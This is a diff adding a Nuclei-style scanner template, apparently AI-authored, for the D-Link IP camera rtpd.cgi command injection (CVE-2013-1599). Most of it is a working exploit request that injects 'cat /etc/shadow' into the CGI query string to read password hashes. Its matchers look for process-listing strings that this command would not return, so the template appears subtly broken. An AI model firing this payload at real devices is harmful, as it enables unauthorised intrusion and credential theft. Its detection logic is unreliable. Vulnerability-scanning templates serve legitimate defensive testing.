@@ -1,0 +1,41 @@
+id: dlink-rtpd-cgi-command-injection
+info:
+  name: DLINK rtpd.cgi Command Injection (CVE-2013-1599)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    A Command Injection vulnerability exists in the /var/www/cgi-bin/rtpd.cgi script in D-Link IP Cameras, allowing a remote malicious user to execute arbitrary commands through the camera's web interface.
+  classification:
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cve-id: CVE-2013-1599
+  reference:
+    - http://www.exploit-db.com/exploits/25138
+    - http://www.securityfocus.com/bid/59564
+    - https://exchange.xforce.ibmcloud.com/vulnerabilities/83941
+    - https://packetstormsecurity.com/files/cve/CVE-2013-1599
+    - https://seclists.org/fulldisclosure/2013/Apr/253
+    - https://www.coresecurity.com/advisories/d-link-ip-cameras-multiple-vulnerabilities
+    - https://nvd.nist.gov/vuln/detail/CVE-2013-1599
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-1599
+  tags: command-injection
+
+variables:
+  cmd: "cat /etc/shadow"
+
+http:
+  - raw:
+      - |
+        GET /cgi-bin/rtpd.cgi?{{cmd}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "var/www/cgi-bin/rtpd.cgi"
+          - "/sbin/watchDog"
+        part: body
+      - type: status
+        status:
+          - 200
